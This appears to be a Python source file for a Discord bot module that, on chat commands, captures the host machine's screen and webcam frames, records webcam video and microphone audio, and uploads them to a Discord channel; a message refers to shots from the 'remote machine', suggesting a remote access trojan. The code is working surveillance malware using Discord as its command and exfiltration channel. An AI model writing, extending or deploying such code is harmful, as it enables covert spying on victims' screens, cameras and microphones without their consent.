import os
import time
import cv2
import sounddevice as sd
import soundfile as sf
import discord
from discord.ext import commands
from datetime import datetime
import asyncio
import threading
import mss
import io

class Media(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_streaming_visuals = False
        self.voice_client = None

    @commands.command(name="join", help="Make the bot join a voice channel for streaming.")
    async def join_voice(self, ctx, *, channel_name: str):
        channel = discord.utils.get(ctx.guild.voice_channels, name=channel_name)
        if not channel:
            await ctx.send(f"❌ Error: Voice channel '{channel_name}' not found.")
            return
        
        try:
            self.voice_client = await channel.connect()
            await ctx.send(f"🎙️ Joined voice channel: `{channel_name}`")
        except Exception as e:
            await ctx.send(f"❌ Voice Error: {str(e)}")

    @commands.command(name="leave", help="Make the bot leave the voice channel.")
    async def leave_voice(self, ctx):
        if self.voice_client:
            await self.voice_client.disconnect()
            self.voice_client = None
            await ctx.send("🛑 Left voice channel.")
        else:
            await ctx.send("⚠️ Bot is not in a voice channel.")

    @commands.command(name="stream_visuals", help="Start high-frequency visual streaming (cam or screen).")
    async def stream_visuals(self, ctx, mode: str = "screen", interval: float = 2.0):
        if self.is_streaming_visuals:
            await ctx.send("⚠️ Already streaming visuals.")
            return

        self.is_streaming_visuals = True
        await ctx.send(f"🎬 Starting {mode} stream (every {interval}s)...")
        
        try:
            while self.is_streaming_visuals:
                if mode == "screen":
                    with mss.mss() as sct:
                        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                        screenshot = sct.grab(monitor)
                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                        filename = "stream_frame.png"
                else: # cam mode
                    cam = cv2.VideoCapture(0)
                    ret, frame = cam.read()
                    cam.release()
                    if ret:
                        _, buffer = cv2.imencode('.jpg', frame)
                        img_bytes = buffer.tobytes()
                        filename = "stream_frame.jpg"
                    else:
                        break

                discord_file = discord.File(io.BytesIO(img_bytes), filename=filename)
                # Overwrite the same message or send new ones?
                # For now, we send new ones to show activity
                await ctx.send(file=discord_file, delete_after=interval + 1)
                await asyncio.sleep(interval)
        except Exception as e:
            await ctx.send(f"❌ Stream Error: {str(e)}")
            self.is_streaming_visuals = False

    @commands.command(name="stop_stream", help="Stop visual streaming.")
    async def stop_stream(self, ctx):
        self.is_streaming_visuals = False
        await ctx.send("🛑 Visual stream stopped.")

    # ... (existing camshot, camvid, audiorecord commands below)
    async def camshot(self, ctx):
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                await ctx.send("❌ Error: No camera found or access denied.")
                return

            ret, frame = cam.read()
            cam.release()

            if ret:
                file_path = f"camshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                cv2.imwrite(file_path, frame)
                await ctx.send(f"📸 Camera shot from {ctx.author.name}'s remote machine:", file=discord.File(file_path))
                os.remove(file_path)
            else:
                await ctx.send("❌ Error: Could not read frame from camera.")
        except Exception as e:
            await ctx.send(f"❌ Camera Error: {str(e)}")

    @commands.command(name="camvid", help="Record a short video (default 5s).")
    async def camvid(self, ctx, seconds: int = 5):
        if seconds > 30:
            await ctx.send("⚠️ Max video duration is 30 seconds.")
            seconds = 30

        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                await ctx.send("❌ Error: No camera found.")
                return

            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            file_path = f"camvid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
            
            # Get camera properties
            width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = 20.0
            
            out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
            
            await ctx.send(f"📹 Recording {seconds}s video...")
            
            start_time = time.time()
            while int(time.time() - start_time) < seconds:
                ret, frame = cam.read()
                if ret:
                    out.write(frame)
                else:
                    break
            
            cam.release()
            out.release()
            
            await ctx.send(f"📹 Video record complete:", file=discord.File(file_path))
            os.remove(file_path)
        except Exception as e:
            await ctx.send(f"❌ Video Error: {str(e)}")

    @commands.command(name="audiorecord", help="Record audio (default 10s).")
    async def audiorecord(self, ctx, seconds: int = 10):
        if seconds > 60:
            await ctx.send("⚠️ Max audio duration is 60 seconds.")
            seconds = 60

        try:
            fs = 44100  # Sample rate
            await ctx.send(f"🎙️ Recording {seconds}s audio...")
            
            # Record audio in a non-blocking way
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()  # Wait for recording to finish
            
            file_path = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            sf.write(file_path, recording, fs)
            
            await ctx.send(f"🎙️ Audio record complete:", file=discord.File(file_path))
            os.remove(file_path)
        except Exception as e:
            await ctx.send(f"❌ Audio Error: {str(e)}")

async def setup(bot):
    await bot.add_cog(Media(bot))
